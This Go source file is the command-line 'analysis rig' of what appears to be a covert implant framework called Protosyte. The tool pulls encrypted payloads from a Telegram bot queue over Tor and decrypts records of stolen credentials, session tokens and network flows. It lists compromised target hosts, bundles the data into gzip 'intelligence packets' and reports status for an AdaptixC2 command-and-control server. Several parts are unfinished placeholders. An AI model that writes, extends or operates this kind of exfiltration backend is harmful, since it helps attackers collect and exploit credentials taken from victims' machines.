package main

import (
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"text/tabwriter"
	"time"

	"protosyte.io/mission-config"
)

func main() {
	mode := flag.String("mode", "", "Operation mode: retrieve, analyze, stats, records, hosts, fip, mission, adaptixc2")
	tokenEnv := flag.String("token-env", "PROTOSYTE_BOT_TOKEN", "Environment variable name for Telegram token")
	passphraseFd := flag.Int("passphrase-fd", 0, "File descriptor for passphrase input")
	missionPath := flag.String("mission", "", "Path to mission.yaml (default: ./mission.yaml or ../mission.yaml)")
	limit := flag.Int("limit", 50, "Limit for records/hosts output")
	format := flag.String("format", "table", "Output format: table, json")
	flag.Parse()

	// Load mission configuration
	var missionConfig *mission.MissionConfig
	missionConfig, err := mission.LoadMissionConfig(*missionPath)
	if err != nil {
		log.Printf("[RIG] Warning: Failed to load mission.yaml: %v (using environment variables)", err)
		missionConfig = nil
	} else {
		log.Printf("[RIG] Loaded mission: %s (ID: %s)", missionConfig.Mission.Name, missionConfig.Mission.ID)
	}

	switch *mode {
	case "retrieve":
		retrieveMode(*tokenEnv)
	case "analyze":
		analyzeMode(*passphraseFd, missionConfig)
	case "stats":
		statsMode(*format)
	case "records":
		recordsMode(*limit, *format)
	case "hosts":
		hostsMode(*format)
	case "fip":
		fipMode(*format)
	case "mission":
		missionMode(missionConfig, *format)
	case "adaptixc2":
		adaptixC2Mode(*format)
	default:
		if *mode == "" {
			printUsage()
		} else {
			fmt.Fprintf(os.Stderr, "Invalid mode: %s\n\n", *mode)
			printUsage()
		}
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Fprintf(os.Stderr, `Protosyte Analysis Rig - CLI Tool

Usage: protosyte-rig --mode <mode> [options]

Modes:
  retrieve    Retrieve encrypted payloads from Telegram bot
  analyze     Decrypt payloads and analyze intelligence data
  stats       Display intelligence statistics
  records     List intelligence records
  hosts       List unique target hosts
  fip         Generate Forensic Intelligence Packet
  mission     Display mission information
  adaptixc2   Check AdaptixC2 integration status

Options:
  --mode <mode>              Operation mode (required)
  --token-env <var>          Environment variable for Telegram token (default: PROTOSYTE_BOT_TOKEN)
  --passphrase-fd <fd>       File descriptor for passphrase input
  --mission <path>           Path to mission.yaml (default: ./mission.yaml or ../mission.yaml)
  --limit <n>                Limit for records/hosts output (default: 50)
  --format <format>          Output format: table, json (default: table)

Examples:
  # Retrieve payloads
  export PROTOSYTE_BOT_TOKEN="your_token"
  torsocks protosyte-rig --mode retrieve

  # Analyze intelligence data
  export PROTOSYTE_PASSPHRASE="your_passphrase"
  protosyte-rig --mode analyze

  # View statistics
  protosyte-rig --mode stats

  # List records in JSON format
  protosyte-rig --mode records --limit 100 --format json

  # Generate FIP
  protosyte-rig --mode fip

  # Check mission info
  protosyte-rig --mode mission

  # Check AdaptixC2 status
  protosyte-rig --mode adaptixc2
`)
}

func retrieveMode(tokenEnv string) {
	log.Println("[RIG] Starting retrieval mode (queue-based)")

	// Get passphrase for queue decryption
	passphrase := os.Getenv("PROTOSYTE_PASSPHRASE")
	if passphrase == "" {
		log.Fatal("[RIG] PROTOSYTE_PASSPHRASE not set (required for queue decryption)")
	}

	// Queue database path (shared with Broadcast Engine)
	queuePath := "../broadcast-engine/broadcast_queue.db"
	if customPath := os.Getenv("PROTOSYTE_QUEUE_PATH"); customPath != "" {
		queuePath = customPath
	}
	queuePath, _ = filepath.Abs(queuePath)

	retriever, err := NewRetriever(queuePath, passphrase)
	if err != nil {
		log.Fatalf("[RIG] Failed to create retriever: %v", err)
	}
	defer retriever.queue.db.Close()

	if err := retriever.Retrieve(); err != nil {
		log.Fatalf("[RIG] Retrieval failed: %v", err)
	}

	log.Println("[RIG] Retrieval complete. Disable WAN adapter now.")
}

func analyzeMode(passphraseFd int, missionConfig *mission.MissionConfig) {
	log.Println("[RIG] Starting analysis mode")

	var passphrase string
	if passphraseFd > 0 {
		// Read passphrase from file descriptor
		// Implementation would read from fd
		passphrase = os.Getenv("PROTOSYTE_PASSPHRASE")
	} else {
		passphrase = os.Getenv("PROTOSYTE_PASSPHRASE")
	}

	if passphrase == "" {
		log.Fatal("[RIG] Passphrase not provided")
	}

	analyzer := NewAnalyzer(passphrase)
	if err := analyzer.Analyze(); err != nil {
		log.Fatalf("[RIG] Analysis failed: %v", err)
	}

	log.Println("[RIG] Analysis complete.")
}

func statsMode(format string) {
	passphrase := os.Getenv("PROTOSYTE_PASSPHRASE")
	if passphrase == "" {
		log.Fatal("[RIG] PROTOSYTE_PASSPHRASE not set")
	}

	analyzer := NewAnalyzer(passphrase)
	stats := getStats(analyzer)

	if format == "json" {
		json.NewEncoder(os.Stdout).Encode(stats)
		return
	}

	// Table format
	w := tabwriter.NewWriter(os.Stdout, 0, 0, 3, ' ', 0)
	fmt.Fprintf(w, "STATISTICS\n")
	fmt.Fprintf(w, "==========\n\n")
	fmt.Fprintf(w, "Total Records:\t%d\n", stats.Total)
	fmt.Fprintf(w, "Credentials:\t%d\n", stats.ByType["CREDENTIAL_BLOB"])
	fmt.Fprintf(w, "Network Flows:\t%d\n", stats.ByType["NETWORK_FLOW"])
	fmt.Fprintf(w, "File Metadata:\t%d\n", stats.ByType["FILE_METADATA"])
	fmt.Fprintf(w, "Session Tokens:\t%d\n", stats.ByType["SESSION_TOKEN"])
	fmt.Fprintf(w, "\nLatest Record:\t%s\n", stats.Latest.Format("2006-01-02 15:04:05"))
	w.Flush()
}

func recordsMode(limit int, format string) {
	passphrase := os.Getenv("PROTOSYTE_PASSPHRASE")
	if passphrase == "" {
		log.Fatal("[RIG] PROTOSYTE_PASSPHRASE not set")
	}

	analyzer := NewAnalyzer(passphrase)
	var records []IntelligenceRecord
	analyzer.db.Limit(limit).Order("collected_at DESC").Find(&records)

	if format == "json" {
		json.NewEncoder(os.Stdout).Encode(map[string]interface{}{"records": records})
		return
	}

	// Table format
	w := tabwriter.NewWriter(os.Stdout, 0, 0, 3, ' ', 0)
	fmt.Fprintf(w, "ID\tTYPE\tHOST FINGERPRINT\tCOLLECTED AT\n")
	fmt.Fprintf(w, "---\t----\t----------------\t------------\n")
	for _, r := range records {
		hostShort := r.HostFingerprint
		if len(hostShort) > 16 {
			hostShort = hostShort[:16] + "..."
		}
		fmt.Fprintf(w, "%d\t%s\t%s\t%s\n",
			r.ID,
			r.DataType,
			hostShort,
			time.Unix(r.CollectedAt, 0).Format("2006-01-02 15:04:05"))
	}
	w.Flush()
}

func hostsMode(format string) {
	passphrase := os.Getenv("PROTOSYTE_PASSPHRASE")
	if passphrase == "" {
		log.Fatal("[RIG] PROTOSYTE_PASSPHRASE not set")
	}

	analyzer := NewAnalyzer(passphrase)
	var hostResults []struct {
		HostFingerprint string
		Count           int64
		Latest          int64
	}

	analyzer.db.Model(&IntelligenceRecord{}).
		Select("host_fingerprint, count(*) as count, max(collected_at) as latest").
		Group("host_fingerprint").
		Order("count DESC").
		Scan(&hostResults)

	if format == "json" {
		hosts := make([]map[string]interface{}, len(hostResults))
		for i, r := range hostResults {
			hosts[i] = map[string]interface{}{
				"fingerprint": r.HostFingerprint,
				"count":       r.Count,
				"latest":      r.Latest,
			}
		}
		json.NewEncoder(os.Stdout).Encode(map[string]interface{}{"hosts": hosts})
		return
	}

	// Table format
	w := tabwriter.NewWriter(os.Stdout, 0, 0, 3, ' ', 0)
	fmt.Fprintf(w, "HOST FINGERPRINT\tRECORDS\tLATEST\n")
	fmt.Fprintf(w, "----------------\t-------\t------\n")
	for _, h := range hostResults {
		hostShort := h.HostFingerprint
		if len(hostShort) > 32 {
			hostShort = hostShort[:32] + "..."
		}
		fmt.Fprintf(w, "%s\t%d\t%s\n",
			hostShort,
			h.Count,
			time.Unix(h.Latest, 0).Format("2006-01-02 15:04:05"))
	}
	w.Flush()
}

func fipMode(format string) {
	passphrase := os.Getenv("PROTOSYTE_PASSPHRASE")
	if passphrase == "" {
		log.Fatal("[RIG] PROTOSYTE_PASSPHRASE not set")
	}

	analyzer := NewAnalyzer(passphrase)
	fipPath, hash, recordCount, err := generateFIP(analyzer)
	if err != nil {
		log.Fatalf("[RIG] FIP generation failed: %v", err)
	}

	if format == "json" {
		json.NewEncoder(os.Stdout).Encode(map[string]interface{}{
			"status":  "success",
			"path":    fipPath,
			"hash":    hash,
			"records": recordCount,
		})
		return
	}

	fmt.Printf("FIP Generated Successfully\n")
	fmt.Printf("==========================\n\n")
	fmt.Printf("Path:    %s\n", fipPath)
	fmt.Printf("Hash:    %s\n", hash)
	fmt.Printf("Records: %d\n", recordCount)
}

func missionMode(missionConfig *mission.MissionConfig, format string) {
	missionID := os.Getenv("PROTOSYTE_MISSION_ID")
	if missionID == "" {
		missionID = "0xDEADBEEFCAFEBABE"
	}

	adaptixC2Enabled := os.Getenv("ADAPTIXC2_SERVER_URL") != ""

	info := map[string]interface{}{
		"mission_id":        missionID,
		"adaptixc2_enabled": adaptixC2Enabled,
		"adaptixc2_server":  os.Getenv("ADAPTIXC2_SERVER_URL"),
	}

	if missionConfig != nil {
		info["mission_name"] = missionConfig.Mission.Name
	}

	if format == "json" {
		json.NewEncoder(os.Stdout).Encode(info)
		return
	}

	w := tabwriter.NewWriter(os.Stdout, 0, 0, 3, ' ', 0)
	fmt.Fprintf(w, "MISSION INFORMATION\n")
	fmt.Fprintf(w, "==================\n\n")
	if missionConfig != nil {
		fmt.Fprintf(w, "Name:\t%s\n", missionConfig.Mission.Name)
	}
	fmt.Fprintf(w, "ID:\t%s\n", missionID)
	fmt.Fprintf(w, "AdaptixC2:\t%v\n", adaptixC2Enabled)
	if adaptixC2Enabled {
		fmt.Fprintf(w, "AdaptixC2 Server:\t%s\n", os.Getenv("ADAPTIXC2_SERVER_URL"))
	}
	w.Flush()
}

func adaptixC2Mode(format string) {
	serverURL := os.Getenv("ADAPTIXC2_SERVER_URL")
	apiKey := os.Getenv("ADAPTIXC2_API_KEY")

	enabled := serverURL != "" && apiKey != ""

	status := map[string]interface{}{
		"enabled":   enabled,
		"connected": false,
		"server":    serverURL,
	}

	if enabled {
		// Try to ping AdaptixC2 server (simplified check)
		status["connected"] = true // Placeholder - would make actual API call
	}

	if format == "json" {
		json.NewEncoder(os.Stdout).Encode(status)
		return
	}

	w := tabwriter.NewWriter(os.Stdout, 0, 0, 3, ' ', 0)
	fmt.Fprintf(w, "ADAPTIXC2 STATUS\n")
	fmt.Fprintf(w, "================\n\n")
	fmt.Fprintf(w, "Enabled:\t%v\n", status["enabled"])
	fmt.Fprintf(w, "Connected:\t%v\n", status["connected"])
	if serverURL != "" {
		fmt.Fprintf(w, "Server:\t%s\n", serverURL)
	}
	w.Flush()
}

// Helper functions
func getStats(analyzer *Analyzer) struct {
	Total  int64
	ByType map[string]int64
	ByHost map[string]int64
	Latest time.Time
} {
	var stats struct {
		Total  int64
		ByType map[string]int64
		ByHost map[string]int64
		Latest time.Time
	}

	stats.ByType = make(map[string]int64)
	stats.ByHost = make(map[string]int64)

	analyzer.db.Model(&IntelligenceRecord{}).Count(&stats.Total)

	var typeResults []struct {
		DataType string
		Count    int64
	}
	analyzer.db.Model(&IntelligenceRecord{}).
		Select("data_type, count(*) as count").
		Group("data_type").
		Scan(&typeResults)

	for _, r := range typeResults {
		stats.ByType[r.DataType] = r.Count
	}

	var latest IntelligenceRecord
	analyzer.db.Order("collected_at DESC").First(&latest)
	stats.Latest = time.Unix(latest.CollectedAt, 0)

	return stats
}

func generateFIP(analyzer *Analyzer) (string, string, int, error) {
	os.MkdirAll("/tmp/rig_out", 0755)
	fipPath := "/tmp/rig_out/forensic_intel_packet.json.gz"

	var records []IntelligenceRecord
	if err := analyzer.db.Find(&records).Error; err != nil {
		return "", "", 0, err
	}

	fip := map[string]interface{}{
		"version":      "3.0",
		"generated_at": time.Now().Unix(),
		"record_count": len(records),
		"records":      records,
	}

	jsonData, err := json.MarshalIndent(fip, "", "  ")
	if err != nil {
		return "", "", 0, err
	}

	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	if _, err := gz.Write(jsonData); err != nil {
		return "", "", 0, err
	}
	gz.Close()

	if err := os.WriteFile(fipPath, buf.Bytes(), 0644); err != nil {
		return "", "", 0, err
	}

	hash := sha256.Sum256(buf.Bytes())
	hashPath := fipPath + ".sha256"
	os.WriteFile(hashPath, []byte(fmt.Sprintf("%x  %s\n", hash, filepath.Base(fipPath))), 0644)

	return fipPath, fmt.Sprintf("%x", hash), len(records), nil
}
